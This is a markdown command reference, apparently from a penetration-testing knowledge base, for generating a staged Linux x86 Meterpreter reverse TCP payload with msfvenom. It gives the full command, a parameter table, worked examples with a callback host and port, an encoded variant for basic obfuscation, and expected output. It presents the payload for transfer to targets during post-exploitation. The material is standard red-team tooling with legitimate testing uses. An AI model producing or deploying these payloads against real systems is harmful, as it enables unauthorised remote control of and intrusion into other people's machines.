---
type: command
executor: bash
data: >-
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f
  elf > reverse.elf
platforms:
  - Linux
tags:
  - payload-generation
  - meterpreter
  - reverse-tcp
verified: true
validated: true
---

# msfvenom-generate-linux-x86-meterpreter-reverse-tcp

## Command

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f elf > reverse.elf
```

## Description

This command uses msfvenom from the Metasploit Framework to generate a staged reverse TCP Meterpreter payload in ELF format for Linux x86 systems. The resulting binary acts as a stager that connects back to the specified host and port, downloads the full Meterpreter stage, and establishes a C2 session. Use this during post-exploitation to create compact payloads for transfer to targets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | IP address of the attacker's listening host | Yes |
| $_LPORT | Port on which the handler is listening | Yes |
| -p | Specifies the payload type (linux/x86/meterpreter/reverse_tcp) | Yes |
| -f elf | Output format as ELF executable for Linux | Yes |
| > reverse.elf | Redirects output to the payload file | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > reverse.elf
```

### Advanced Usage

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -e x86/shikata_ga_nai > reverse_encoded.elf
```

(Adds encoding for basic obfuscation.)

## Expected Output

The command runs silently if successful, producing a file like:

```bash
$ ls -l reverse.elf
-rw-r--r-- 1 user user 338 Apr 6 03:56 reverse.elf
```

No stdout output; check file creation and size (small for staged payload). Errors may include "Unknown payload" if Metasploit modules are missing.

## Related

- [[procedures/Linux-Staged-Reverse-TCP-Meterpreter-Shell]]
- [[tools/Metasploit-Framework]]
